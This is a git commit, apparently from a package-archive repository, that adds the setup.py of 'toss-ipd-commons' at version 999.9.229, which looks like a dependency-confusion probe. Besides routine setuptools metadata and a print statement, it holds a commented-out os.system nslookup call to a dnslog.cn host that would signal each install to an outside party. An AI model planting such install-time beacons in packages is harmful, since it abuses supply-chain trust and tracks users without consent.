c7e13c658ad49677e319f2882e794780530ba935
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-11-17 04:05:18 +0000

    Add package toss-ipd-commons/999.9.229/toss-ipd-commons-999.9.229.tar.gz

---
+++ packages/toss-ipd-commons/toss-ipd-commons-999.9.229.tar.gz/toss-ipd-commons-999.9.229/setup.py
@@ -0,0 +1,26 @@
+import setuptools
+import os
+
+print("[*] PYOZZI PRINT")
+# os.system("nslookup ix6dpp.dnslog.cn")
+
+with open("README.md","r") as f:
+    longDesc = f.read()
+
+setuptools.setup(
+    name="toss-ipd-commons",
+    version="999.9.229",
+    author="pyozzi",
+    author_email="pyozzi@toss.im",
+    description="test library",
+    long_description=longDesc,
+    long_description_content_type="text/markdown",
+    url="https://github.com/pyozzi",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent"
+    ],
+    python_requires=">=3.6"
+)
